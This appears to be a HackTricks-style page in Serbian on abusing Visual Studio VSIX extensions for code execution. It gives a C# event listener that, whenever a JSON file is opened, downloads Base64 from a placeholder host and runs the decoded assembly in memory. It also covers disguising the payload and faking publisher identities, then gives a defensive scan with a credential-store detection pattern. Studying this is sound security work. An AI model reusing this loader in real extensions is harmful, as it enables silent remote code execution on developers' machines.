# Zloupotreba Visual Studio VSIX dodatka

{{#include ../banners/hacktricks-training.md}}

Visual Studio dodatak može da pretvori uobičajeni rad u editoru u izvršavanje koda u kontekstu identiteta prijavljenog korisnika. Zlonamerni VSIX, izdavač koji se lažno predstavlja ili kompromitovano ažuriranje dodatka mogu da dođu do tog korisnika putem uobičajenih kanala za instalaciju. Instalacija uz administratorski upit predstavlja instalaciju uz pristanak, a ne automatsko podizanje privilegija.<sup>[[1]](#references)</sup>

## Model izvršavanja

Klasični VSSDK dodaci obično se izvršavaju unutar `devenv.exe`. Noviji model `VisualStudio.Extensibility` prvenstveno pokreće moderna .NET proširenja van procesa: Visual Studio posreduje u pozivima ka namenskom procesu `Microsoft.ServiceHub.Host.Extensibility`, čime se izoluje stabilnost IDE-a, ali se proširenje **ne** stavlja u sandbox koji bi ga odvojio od Windows dozvola korisnika. Tačan naziv izvršne datoteke može da sadrži sufiks arhitekture, kao što je `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Pokretanje pri uobičajenoj aktivnosti u editoru

Umesto da izlaže samo upadljivu komandu u meniju, dodatak može da implementira `ITextViewOpenClosedListener`. Njegov callback `TextViewOpenedAsync` poziva se za odgovarajuće dokumente, dok `TextViewExtensionConfiguration.AppliesTo` može da ograniči aktivaciju na uobičajeni tip, kao što je JSON. Pravi formatter ili linter i dalje može da obavlja oglašeni posao, dok se druga radnja izvršava kao sporedni efekat otvaranja datoteke.<sup>[[1]](#references)[[3]](#references)</sup>

Sledeći pojednostavljeni obrazac prikazuje važne tačke izvršavanja; radi jasnoće, izostavljeni su legitimni formatter i obrada grešaka.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Učitavač upravljanog sklopa u memoriji pokrenut događajem</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Ovaj lanac preuzima Base64 tekst, dekodira ga u assembly bajtove, učitava iz MemoryStream-a pomoću kolekcionog AssemblyLoadContext-a, poziva reflektovani EntryPoint bez parametara ili sa string[] argumentom, čeka asinhrone ulazne tačke i oslobađa kontekst. Druga faza se ne zapisuje na disk, iako VSIX i primarni DLL ekstenzije ostaju artefakti na disku. Base64 ne obezbeđuje autentičnost ni poverljivost; korišćenje HTTP-a omogućava i napadaču na putanji da zameni odgovor.<sup>[[1]](#references)</sup>

Operativne varijacije uključuju potiskivanje svih izuzetaka kako bi oglašena funkcija nastavila da radi u slučaju neuspešnog staging-a ili korišćenje ITextViewChangedListener-a za pokretanje nakon izmena. Kod se izvršava u hostu ekstenzije i može da koristi upravljane API-je, P/Invoke, datoteke, akreditive i podređene procese dostupne tom korisniku.<sup>[[1]](#references)</sup>

Za srodnu površinu za izvršavanje specifičnu za editor, zasnovanu na automatskom učitavanju nativnih plug-inova, pogledajte:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Zloupotreba poverenja u Marketplace i načina isporuke

VSIX može stići kao direktno deljena ili fišing datoteka, sa veb Marketplace-a ili preko ugrađenog Marketplace pregledača u Visual Studio-u. Registracija izdavača, koja uglavnom proverava jedinstvenost i listu rezervisanih reči, može omogućiti identitete izdavača koji vizuelno deluju uverljivo; kompromitovanje već pouzdanog izdavača ili ekstenzije još je efikasnije jer nasleđuje bazu instaliranih korisnika. Instalacija sa Marketplace-a pokreće Visual Studio Installer i privremeno smešta preuzeti VSIX u `%LOCALAPPDATA%\Temp`; `payload.vsix` se koristi i legitimno, pa samo ime datoteke nije pokazatelj.<sup>[[1]](#references)</sup>

MDSec nije identifikovao Visual Studio URL protokol koji direktno instalira ekstenziju. Operateru je i dalje potrebno da korisnik instalira/pouzdaje VSIX ili da kompromituje putanju distribucije postojeće ekstenzije. Paket `AllUsers` instalira se u fasciklu za instalaciju Visual Studio-a i može zahtevati povišene privilegije, ali to je uobičajeno ponašanje instalacionog programa uz saglasnost korisnika, a ne automatski put do administratora ili SYSTEM-a.<sup>[[1]](#references)[[4]](#references)</sup>

### Statička provera u velikom obimu

VSIX paketi su obično ZIP kontejneri, pa bezbedan proces pregleda Marketplace-a može da nabroji pakete, raspakuje ih **bez učitavanja koda ekstenzije**, obradi njihove manifeste, identifikuje izvršne površine i dekompajlira upravljane assembly-je pomoću `ilspycmd`. Dajte prednost assembly-jima koje poseduje ekstenzija nakon što isključite uobičajene priložene zavisnosti, a zatim povežite nizove koji upućuju na skladišta akreditiva sa grupama ponašanja kao što su čitanje datoteka i slanje preko mreže, kodiranje i slanje, preuzimanje i izvršavanje, pristup upravljaču akreditivima i mreži ili pravljenje snimka ekrana i slanje.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Takođe popišite native DLL-ove, MSBuild targete, skripte, T4 template-ove i payload-ove instalera, umesto da pretpostavite da je svaka površina za izvršavanje managed code. Uporedite sumnjivo ponašanje sa svrhom navedenom u manifestu; telemetrija i legitimni programi za ažuriranje mogu ličiti na exfiltration ili staging. Pregled koji se oslanja samo na statičku analizu propušta zapakovan, obfuskovan, dinamički razrešen i neaktivan kod, a pregled samo najnovije verzije propušta zlonamerna izdanja iz prošlosti.<sup>[[1]](#references)</sup>

VS Code koristi drugačiji extension host i manifest. Za upisivi share koji pokreće automatizovanu instalaciju VS Code ekstenzije, pogledajte [izvršavanje putem drop-share-a za VS Code ekstenzije](vscode-extension-abuse.md).

Odvojen napad pri učitavanju projekta može da izvrši zlonamerni [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) bez instaliranja VSIX-a.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Ponovni osvrt na Visual Studio ekstenzije](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - O VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomija VSIX paketa](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET alat](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Kampanja Blinder Tunnel cilja iračku infrastrukturu](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
